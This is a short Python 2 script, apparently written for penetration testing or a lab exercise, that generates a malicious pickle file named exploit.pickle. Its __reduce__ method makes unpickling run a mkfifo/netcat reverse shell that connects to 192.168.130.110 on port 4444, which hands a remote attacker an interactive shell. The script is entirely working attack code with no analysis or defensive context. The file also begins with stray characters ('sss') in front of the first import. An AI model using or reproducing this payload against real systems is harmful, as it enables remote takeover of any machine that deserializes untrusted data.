sssimport cPickle
import os
import base64
import pickletools

class Exploit(object):
  def __reduce__(self):
    return (os.system, (("rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.130.110 4444 >/tmp/f"),))

with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
